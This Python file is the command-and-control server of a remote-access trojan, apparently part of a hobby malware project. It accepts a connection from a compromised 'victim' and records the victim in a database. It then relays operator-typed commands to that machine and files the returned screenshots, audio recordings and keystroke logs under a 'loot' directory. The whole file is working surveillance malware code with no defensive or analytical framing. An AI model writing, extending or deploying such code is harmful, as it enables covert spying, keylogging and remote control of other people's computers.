import argparse
import os
import socket
import io
import json
from db import (
    init_db,
    insert_victim
)

parser = argparse.ArgumentParser(prog="Just a kiddie")
parser.add_argument('--host', required=True)
parser.add_argument('--port', required=True, type=int)

cwd = "~"



def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()

    conn, addr = server.accept()
    return conn, addr


def get_user_info(conn):
    banner = conn.recv(4096)
    user_info = json.loads(banner.decode())

    return user_info



def setup_storage(victim_id):
    base = os.path.join("loot", victim_id)
    
    os.makedirs(os.path.join(base, "screenshots"), exist_ok=True)
    os.makedirs(os.path.join(base, "audios"), exist_ok=True)
    os.makedirs(os.path.join(base, "keylogs"), exist_ok=True)
    
    return base


def save_received(base, category, filename, data):
    path = os.path.join(base, category, filename)

    with open(path, "wb") as f:
        f.write(data)
    

def unfold_parts(parts):
    # just like the banner
    # TYPE|LENGTH|EXTRA\n

    type = parts[0]
    length = parts[1]
    extra = parts[2].strip()

    return type, length, extra


def recv_banner(conn):
    banner = b""
    
    while not banner.endswith(b"\n"):
        banner += conn.recv(1)

    return banner.decode().strip()


def recv_data(conn, length):
    data = b""

    while len(data) < length:
        chunk = conn.recv(min(4096, length - len(data)))
        if not chunk: 
            break
        data += chunk

    return data


def main():
    global cwd

    init_db()
    args = parser.parse_args()
    conn, addr = start_server(args.host, args.port)

    if not conn:
        print("[!] Could not connect!")
        return
    

    print(f"[i] Connected to host: {addr[0]}:{addr[1]}")

    user_info = get_user_info(conn=conn)
    base = setup_storage(user_info["vic_id"])
    insert_victim(user_info)



    while True:
        cmd = str(input(f"{cwd} > "))

        conn.send(cmd.encode())

        banner = recv_banner(conn)
        parts = banner.split("|")
        
        type, length, extra = unfold_parts(parts)
        data = recv_data(conn, int(length))

        match type:
            case "PNG":
                save_received(base, "screenshots", extra, data)

            case "WAV":
                save_received(base, "audios", extra, data)

            case "TMP":
                save_received(base, "keylogs", extra, data)

            case "CWD":
                cwd = extra

            case _:
                print(data.decode())